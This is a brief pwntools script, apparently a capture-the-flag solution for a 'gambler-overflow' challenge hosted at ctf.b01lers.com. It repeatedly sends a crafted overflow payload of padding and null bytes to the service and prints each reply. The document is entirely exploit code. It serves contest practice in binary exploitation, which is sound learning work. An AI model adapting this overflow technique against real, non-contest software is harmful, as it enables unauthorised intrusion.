from pwn import *

p = process('./gambler-overflow')
p = remote('ctf.b01lers.com', 9203)

p.recv()
for _ in range((1000-100)//10+1):

    payload = b'AAAA\x00\x00\x00\x00AAAA'
    p.sendline(payload)

    print(p.recv().decode())
